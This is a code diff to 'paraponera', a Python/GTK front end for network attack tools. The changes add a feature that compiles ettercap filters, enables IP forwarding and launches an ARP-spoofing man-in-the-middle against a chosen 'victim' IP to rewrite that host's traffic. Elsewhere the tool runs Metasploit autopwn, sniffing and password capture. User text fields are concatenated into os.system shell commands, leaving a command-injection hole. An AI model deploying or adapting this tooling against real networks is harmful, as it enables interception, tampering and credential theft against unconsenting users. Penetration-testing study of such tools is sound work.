@@ -104,13 +104,29 @@ class paraponera (object):
 				
 		self.request_file = '/tmp/paraponera.log'
 		
+		self.filter_type = ''
+		
 		self.gateway_txt = self.builder.get_object("gateway_txt")
+		self.filter_gateway_txt = self.builder.get_object("filter_gateway_txt")
+		self.filter_target_txt = self.builder.get_object("filter_target_txt")
 		self.interface_txt = self.builder.get_object("interface_txt")
 		self.manual_txt = self.builder.get_object("manual_txt")
 		self.autopwn_ip_txt = self.builder.get_object("autopwn_ip_txt")
 		self.exploit_txt = self.builder.get_object("exploit_txt")
 		self.msf_command_txt = self.builder.get_object("msf_command_txt")
+		self.filter1_txt = self.builder.get_object("filter1_txt")
+		self.filter2_txt = self.builder.get_object("filter2_txt")
 		
+		self.filter_ch= self.builder.get_object("filter_ch")
+		self.filter_ch.set_current_folder(os.getcwd() +"/filters")
+		
+		
+
+		
+		
+		self.filter1_lb = self.builder.get_object("filter1_lb")
+		self.filter2_lb = self.builder.get_object("filter2_lb")
+		self.filter_lb = self.builder.get_object("filter_lb")
 		self.version_lb = self.builder.get_object("version_lb")
 		self.version_lb.set_label('<b>Version: </b>' + get_version())
 		
@@ -118,6 +134,8 @@ class paraponera (object):
 		self.exploit_txt.modify_text(gtk.STATE_NORMAL,gtk.gdk.color_parse('#FFFFFF'))
 
 		self.sniff_bt = self.builder.get_object("sniff_bt")
+		self.stop_bt = self.builder.get_object("stop_bt")
+		self.filter_start_bt = self.builder.get_object("filter_start_bt")
 		self.images_bt = self.builder.get_object("images_bt")
 		self.manual_bt = self.builder.get_object("manual_bt")
 		self.autopwn_bt = self.builder.get_object("autopwn_bt")
@@ -129,7 +147,6 @@ class paraponera (object):
 
 		self.scrollimages = self.builder.get_object("scrolledwindow2")
 		self.scrollcomputers = self.builder.get_object("scrolledwindow1")
-		self.sessions_scroll = self.builder.get_object("sessions_scroll")
 		self.password_scroll = self.builder.get_object("password_scroll")
 
 		self.attack_image = gtk.gdk.pixbuf_new_from_file(os.getcwd() +"/res/paraponera-ico.png")
@@ -173,8 +190,6 @@ class paraponera (object):
 		self.password_txt = webkit.WebView()
 		self.password_scroll.add(self.password_txt)
 		
-		self.sessions = webkit.WebView()
-		self.sessions_scroll.add(self.sessions)
 
 		self.view = webkit.WebView()
 		self.scrollimages.add(self.view)
@@ -188,6 +203,7 @@ class paraponera (object):
 		self.builder.get_object("window1").show_all()
 		try:
 			self.gateway_txt.set_text(self.get_gateway())
+			self.filter_gateway_txt.set_text(self.get_gateway())
 		except:
 			pass
 		
@@ -195,6 +211,11 @@ class paraponera (object):
 			self.interface_txt.set_text(self.get_interface()[1][0])
 		except:
 			pass
+		
+		self.filter1_txt.set_visible(False)
+		self.filter2_txt.set_visible(False)
+		self.filter1_lb.set_visible(False)
+		self.filter2_lb.set_visible(False)	
 		
 		self.check_paths()
 		self.check_update()
@@ -213,10 +234,6 @@ class paraponera (object):
 			error_msg = error_msg + 'driftnet, ' 
 		if (os.path.isfile(msfconsole_path) == False):
 			error_msg = error_msg + 'msfconsole, ' 
-		if (os.path.isfile(hamster_path) == False):
-			error_msg = error_msg + 'hamster, '
-		if (os.path.isfile(ferret_path) == False):
-			error_msg = error_msg + 'ferret, ' 
 		if (os.path.isfile(ettercap_path) == False):
 			error_msg = error_msg + 'ettercap, '
 			
@@ -252,7 +269,11 @@ class paraponera (object):
 			pass
 
 		
-		pidof = ['ettercap','postgresql','driftnet','sslstrip','arpspoof','ferret','hamster','msfconsole']
+		self.terminate_pid()
+				   
+	def terminate_pid(self):
+		
+		pidof = ['ettercap','postgresql','driftnet','sslstrip','arpspoof','msfconsole']
 		for p in pidof:
 			proc = subprocess.Popen(["pgrep", p], stdout=subprocess.PIPE) 
 
@@ -264,9 +285,7 @@ class paraponera (object):
 				   os.kill(int(pid), 0)
 				  
 				except OSError as ex:
-				   continue 
-				   
-				   
+				   continue 			   
 
 
 	def get_range(self):
@@ -317,7 +336,6 @@ class paraponera (object):
 	
 	def exploit(self):
 		textbuffer = self.exploit_txt.get_buffer()
-		os.system('service postgresql stop &')
 		os.system('service postgresql start &')
 		filewrite=file("autopwn", "w")
 		filewrite.write("load "+ os.getcwd() +"/mods/db_autopwn.rb\r\n")
@@ -334,16 +352,7 @@ class paraponera (object):
 			thr = Thread(target= self.read_output, args=(textbuffer,self.exploit_txt, command))
 			thr.start()
 		
-	
-	def get_sessions(self):
-		self.sessions.open("http://127.0.0.1:1234")
-		
-	def hamster(self):
-		os.system(hamster_path)
-		
-		
-	def ferret(self):
-		os.system(ferret_path + ' -i ' + self.interface_txt.get_text() + ' &')	
+
 
 	def read_output(self,buffer,view,command):
 	     	
@@ -385,6 +394,8 @@ class paraponera (object):
 
 		nm.scan(hosts=self.get_range(), arguments='-O')
 		
+		
+
 		for host in nm.all_hosts():
 			
 			
@@ -409,7 +420,132 @@ class paraponera (object):
 						
 		self.sniff_bt.set_label('Start')
 		
+	
+	
+	def stop_bt_clicked_cb(self,*args):
+		self.terminate_pid()
+		self.manual_bt.set_label('Sniff')
+		for row in self.liststore:
+			self.liststore.set_value(row.iter,3,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye_closed.png'))
 		
+			
+	def filter_ch_file_set_cb(self,*args):
+
+
+		self.filter1_txt.set_visible(False)		
+		self.filter1_lb.set_visible(False)
+		self.filter2_txt.set_visible(False)		
+		self.filter2_lb.set_visible(False)
+				
+		filter_file = open(self.filter_ch.get_filename(),'r')
+		content = filter_file.read()
+		filter_info = content.split('||')
+		filter_file.close
+
+		
+		try:
+			author = filter_info[0].replace('# ', '').replace('Author:','<b>Author:</b>')
+		except:
+			author = 'Author not defined'
+		
+		try:	
+			description  = filter_info[1].replace('# ', '').replace('Description:','<b>Description:</b>')
+		except:
+			description  = 'Description: None'
+		
+		try:
+			self.filter_type = filter_info[2].replace('# Type: ', '').replace('\n','').replace(' ','') # You need to have Type in your filter file
+			
+			if (self.filter_type == "Single"):	
+				self.filter1_lb.set_label('Replace: ')
+				self.filter1_txt.set_visible(True)		
+				self.filter1_lb.set_visible(True)
+			
+			
+			if (self.filter_type == "Multiple"):	
+				self.filter1_lb.set_label('Replace: ')
+				self.filter1_txt.set_visible(True)		
+				self.filter1_lb.set_visible(True)
+				self.filter2_lb.set_label('With: ')
+				self.filter2_txt.set_visible(True)		
+				self.filter2_lb.set_visible(True)
+			
+			
+		except:
+			Messages().msg_error('This filter has no type, please read de README file in filters folder.')
+			author = ''
+			description = ''
+		
+		
+		
+		self.filter_lb.set_label(author + '\t\n' +description + '\t\n')
+		
+		
+		
+		
+	def filter_start_bt_clicked_cb(self,args):
+		
+		proc = subprocess.Popen(["pgrep", 'ettercap'], stdout=subprocess.PIPE) 
+		
+		for pid in proc.stdout:
+			os.kill(int(pid), signal.SIGKILL)
+			
+			try: 
+			   os.kill(int(pid), 0)
+			  
+			except OSError as ex: 
+			   continue 	
+			   
+		filename = '/tmp/' +  self.filter_ch.get_filename().replace(os.getcwd() + '/filters/','')
+		
+		if (self.filter_start_bt.get_label() == 'Start Spoofing'):
+				original_filter = open(self.filter_ch.get_filename(),'r')
+				content = original_filter.read()
+				original_filter.close()
+				
+				
+				
+						
+				if (self.filter_type == "Single"):	
+					file_to_compile = open(filename,'w')
+					replace_me = content.replace('REPLACE_ME',self.filter1_txt.get_text())
+					file_to_compile.write(replace_me)
+					file_to_compile.close()
+					os.system('etterfilter ' + filename +' -o ' + filename +'.ef')
+					
+				if (self.filter_type == "Multiple"):
+					file_to_compile = open(filename,'w')
+					replace_me = content.replace('REPLACE_ME',self.filter1_txt.get_text()).replace('WITH_ME',self.filter2_txt.get_text())
+					file_to_compile.write(replace_me)
+					file_to_compile.close()
+					os.system('etterfilter ' + filename +' -o ' + filename +'.ef')
+					
+				if (self.filter_type == "None"):
+					os.system('etterfilter ' + self.filter_ch.get_filename() +' -o '+ filename +'.ef') 
+				
+				
+				
+				
+				os.system("echo 1 > /proc/sys/net/ipv4/ip_forward &")
+				
+				#WE append :1 to end of file because ettercap has a bug #84
+				os.system('ettercap -Tqi '+ self.interface_txt.get_text() +' --mitm arp:remote /'+ self.filter_target_txt.get_text() +'/ /'+ self.filter_gateway_txt.get_text() +'/ -P autoadd -F ' + filename +'.ef:1 &')
+				
+				self.filter_start_bt.set_label('Stop Spoofing')
+		else:
+			try:
+				os.remove(filename)
+			except:
+				pass
+			try:
+				os.remove(filename + '.ef' )
+			except:
+				pass
+			
+			
+			self.filter_start_bt.set_label('Start Spoofing')
+			
+
 		
 
 	def images_refresh_bt_clicked_cb(self, *args):
@@ -430,6 +566,7 @@ class paraponera (object):
 
 	def autopwn_bt_clicked_cb(self, *args):
 		self.ip_victim = self.autopwn_ip_txt.get_text()
+		self.filter_target_txt.set_text(self.ip_victim)
 		if (self.ip_victim != ''):
 			start_autopwn = Thread(target=self.exploit)
 			start_autopwn.start()
@@ -437,6 +574,7 @@ class paraponera (object):
 
 	def manual_bt_clicked_cb(self, *args):
 		self.ip_victim = self.manual_txt.get_text()
+		self.filter_target_txt.set_text(self.ip_victim)
 		if (self.ip_victim != ''):
 			self.manual_bt.set_label('Sniffing...')
 			self.start_sniffing()
@@ -514,21 +652,14 @@ class paraponera (object):
 		self.start_driftnet = Thread(target=self.driftnet)
 		self.start_driftnet.start()	
 		
-		self.start_hamster = Thread(target=self.hamster)
-		self.start_hamster.start()
-		
-		self.start_ferret = Thread(target=self.ferret)
-		self.start_ferret.start()
-		
-		self.start_session = Thread(target= self.get_sessions)
-		self.start_session.start()
-		
+	
 
 	def selectComputer(self, widget, event):
 			if event.button == 1 and event.type == gtk.gdk._2BUTTON_PRESS:
 			        treeselection = self.treeview.get_selection()
 			        (model, iter) = treeselection.get_selected()
 			        self.ip_victim = self.liststore.get_value(iter, 0)
+			        self.filter_target_txt.set_text(self.ip_victim)
 			    	for row in self.liststore:
 						self.liststore.set_value(row.iter,3,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye_closed.png'))
 				self.liststore.set_value(iter,3,gtk.gdk.pixbuf_new_from_file(os.getcwd() + '/res/eye.png'))
